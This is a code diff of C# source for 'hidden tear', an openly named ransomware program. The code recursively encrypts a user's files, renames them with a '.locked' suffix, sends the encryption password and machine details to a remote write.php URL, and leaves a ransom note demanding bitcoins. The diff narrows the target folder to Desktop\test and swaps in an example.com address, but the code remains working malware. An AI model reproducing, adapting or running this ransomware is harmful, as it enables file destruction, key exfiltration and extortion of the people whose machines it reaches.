@@ -46,11 +46,10 @@ namespace hidden_tear
     public partial class Form1 : Form
     {
         //Url to send encryption password and computer info
-        string targetURL = "http://www.utkusen.com/hidden-tear/write.php?info=";
+        string targetURL = "https://www.example.com/hidden-tear/write.php?info=";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
-        int sendControl = 0;
 
 
 
@@ -139,15 +138,15 @@ namespace hidden_tear
             File.WriteAllBytes(file, bytesEncrypted);
             System.IO.File.Move(file, file+".locked");
 
-            passwordBytes = null;
+            
             
 
         }
 
         //encrypts target directory
-        public void encryptDirectory(string location)
+        public void encryptDirectory(string location, string password)
         {
-            string password = CreatePassword(15);
+            
             //extensions to be encrypt
             var validExtensions = new[]
             {
@@ -164,30 +163,27 @@ namespace hidden_tear
                 }
             }
             for (int i = 0; i < childDirectories.Length; i++){
-                encryptDirectory(childDirectories[i]);
+                encryptDirectory(childDirectories[i],password);
             }
-            if (sendControl == 0)
-            {
-                
-                SendPassword(password);
-                sendControl++;
-            }
-            password = null;
+            
+            
         }
 
         public void startAction()
         {
-            
-            string path = "\\Desktop";
+            string password = CreatePassword(15);
+            string path = "\\Desktop\\test";
             string startPath = userDir + userName + path;
-            encryptDirectory(startPath);
+            SendPassword(password);
+            encryptDirectory(startPath,password);
             messageCreator();
+            password = null;
             System.Windows.Forms.Application.Exit();
         }
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\READ_IT.txt";
+            string path = "\\Desktop\\test\\READ_IT.txt";
             string fullpath = userDir + userName + path;
             string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
             System.IO.File.WriteAllLines(fullpath, lines);
